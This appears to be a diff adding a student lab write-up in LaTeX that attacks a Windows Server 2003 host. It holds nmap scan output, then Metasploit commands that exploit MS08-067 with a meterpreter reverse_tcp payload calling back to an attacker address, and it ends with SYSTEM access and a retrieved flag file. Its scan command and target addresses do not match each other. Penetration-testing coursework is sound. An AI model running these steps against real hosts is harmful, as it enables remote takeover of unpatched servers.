@@ -1,1 +1,121 @@
 \section*{Host 1: 192.168.233.20}
+\par We firstly scanned the open ports by using the command \textit{nmap -s -A -p1-1024 192.168.233.20}. There are the possibility that some ports will not always be opened, or rather, they will be down at times. But we found that the result below is the most common one:
+\par \begin{lstlisting}[language=sh,numbers=left,numberstyle=\tiny,columns=fullflexible,basicstyle=\footnotesize\ttfamily, breaklines=true, breakautoindent=true, breakindent=4em]
+security@BB:~$ sudo nmap -v -A -p1-8000 192.168.233.106
+
+Starting Nmap 6.40 ( http://nmap.org ) at 2014-03-05 00:37 CET
+NSE: Loaded 110 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating Ping Scan at 00:37
+Scanning 192.168.233.20 [4 ports]
+Completed Ping Scan at 00:37, 0.01s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 00:37
+Completed Parallel DNS resolution of 1 host. at 00:37, 0.00s elapsed
+Initiating SYN Stealth Scan at 00:37
+Scanning 192.168.233.20 [8000 ports]
+Discovered open port 445/tcp on 192.168.233.20
+Discovered open port 1025/tcp on 192.168.233.20
+Discovered open port 139/tcp on 192.168.233.20
+Discovered open port 3389/tcp on 192.168.233.20
+Discovered open port 135/tcp on 192.168.233.20
+Discovered open port 1026/tcp on 192.168.233.20
+Completed SYN Stealth Scan at 00:37, 2.22s elapsed (8000 total ports)
+Initiating Service scan at 00:37
+Scanning 6 services on 192.168.233.20
+Completed Service scan at 00:38, 48.67s elapsed (6 services on 1 host)
+Initiating OS detection (try #1) against 192.168.233.20
+Retrying OS detection (try #2) against 192.168.233.20
+Retrying OS detection (try #3) against 192.168.233.20
+Retrying OS detection (try #4) against 192.168.233.20
+Retrying OS detection (try #5) against 192.168.233.20
+Initiating Traceroute at 00:38
+Completed Traceroute at 00:38, 0.01s elapsed
+Initiating Parallel DNS resolution of 2 hosts. at 00:38
+Completed Parallel DNS resolution of 2 hosts. at 00:38, 0.00s elapsed
+NSE: Script scanning 192.168.233.20.
+Initiating NSE at 00:38
+Completed NSE at 00:38, 0.93s elapsed
+Nmap scan report for 192.168.233.20
+Host is up (0.0077s latency).
+Not shown: 7994 closed ports
+PORT     STATE SERVICE        VERSION
+135/tcp  open  msrpc          Microsoft Windows RPC
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds   Microsoft Windows 2003 or 2008 microsoft-ds
+1025/tcp open  msrpc          Microsoft Windows RPC
+1026/tcp open  msrpc          Microsoft Windows RPC
+3389/tcp open  ms-wbt-server?
+No exact OS matches for host (If you know what OS is running on it, see http://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=6.40%E=4%D=3/5%OT=135%CT=1%CU=38086%PV=Y%DS=2%DC=T%G=Y%TM=531663E
+OS:6%P=i686-pc-linux-gnu)SEQ(SP=F8%GCD=1%ISR=10C%TI=I%CI=I%II=I%SS=S%TS=0)O
+OS:PS(O1=M538NW0NNT00NNS%O2=M538NW0NNT00NNS%O3=M538NW0NNT00%O4=M538NW0NNT00
+OS:NNS%O5=M538NW0NNT00NNS%O6=M538NNT00NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FF
+OS:FF%W5=FFFF%W6=FFFF)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M538NW0NNS%CC=N%Q=)T1(R=Y%
+OS:DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=N%T=80%W=0%S=Z%A=S%F=AR%O=%RD=
+OS:0%Q=)T3(R=Y%DF=Y%T=80%W=FFFF%S=O%A=S+%F=AS%O=M538NW0NNT00NNS%RD=0%Q=)T4(
+OS:R=Y%DF=N%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=N%T=80%W=0%S=Z%A=S+%F
+OS:=AR%O=%RD=0%Q=)T6(R=Y%DF=N%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=N%T
+OS:=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=B0%UN=0%RIPL=G%RID
+OS:=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=S%T=80%CD=Z)
+
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=249 (Good luck!)
+IP ID Sequence Generation: Incremental
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| nbstat: 
+|   NetBIOS name: SRV1, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:01:5a:72 (VMware)
+|   Names
+|     SRV1<00>             Flags: <unique><active>
+|     POETSCAFE<00>        Flags: <group><active>
+|     SRV1<20>             Flags: <unique><active>
+|_    POETSCAFE<1e>        Flags: <group><active>
+| smb-os-discovery: 
+|   OS: Windows Server 2003 3790 (Windows Server 2003 5.2)
+|   OS CPE: cpe:/o:microsoft:windows_server_2003::-
+|   Computer name: SRV1
+|   NetBIOS computer name: SRV1
+|   Domain name: poetscafe.local
+|   Forest name: poetscafe.local
+|   FQDN: SRV1.poetscafe.local
+|   NetBIOS domain name: POETSCAFE
+|_  System time: 2014-03-05T01:39:49+01:00
+| smb-security-mode: 
+|   Account that was used for smb scripts: <blank>
+|   User-level authentication
+|   SMB Security: Challenge/response passwords supported
+|_  Message signing disabled (dangerous, but default)
+|_smbv2-enabled: Server doesn't support SMBv2 protocol
+
+TRACEROUTE (using port 3306/tcp)
+HOP RTT     ADDRESS
+1   7.92 ms 10.11.12.1
+2   7.65 ms 192.168.233.20
+
+NSE: Script Post-scanning.
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 62.19 seconds
+           Raw packets sent: 8094 (359.682KB) | Rcvd: 8093 (326.558KB)
+
+\end{lstlisting}
+We found that in port 445 it runs Windows 2003 or 2008 microsoft-ds service, which could exist a flaw. So we searched the Metasploit database and found an exploit called \lstinline{ms08_067_netapi}. It exploits a parsing flaw through the service. We type the following command in the metasploit console:
+\begin{itemize}
+	\item \lstinline{use exploit/windows/smb/ms08_067_netapi} 
+	\item set RHOST 192.168.233.20
+	\item \lstinline{set payload windows/meterpreter/reverse_tcp} 
+	\item set LHOST 10.11.12.29
+	\item run
+	\par \begin{lstlisting}[language=sh,numbers=left,numberstyle=\tiny,columns=fullflexible,basicstyle=\footnotesize\ttfamily, breaklines=true, breakautoindent=true, breakindent=4em]
+[*] Started reverse handler on 10.11.12.29:4444 
+[*] Automatically detecting the target...
+[*] Fingerprint: Windows 2003 - No Service Pack - lang:Unknown
+[*] Selected Target: Windows 2003 SP0 Universal
+[*] Attempting to trigger the vulnerability...
+[*] Sending stage (752128 bytes) to 192.168.233.20
+[*] Meterpreter session 2 opened (10.11.12.29:4444 -> 192.168.233.20:1069) at 2014-03-05 00:57:55 +0100
+	\end{lstlisting}
+	We now get the root access of the machine.By typing \textit{getuid} it shows \lstinline{NT AUTHORITY\SYSTEM}. And we can type other commands to browse the file or view its content. We use \textit{search -f secret.txt} command and found that there do have a file called secret.txt. We opened it, which showed the code:c5zmfVpkSJrFA.
+\end{itemize}
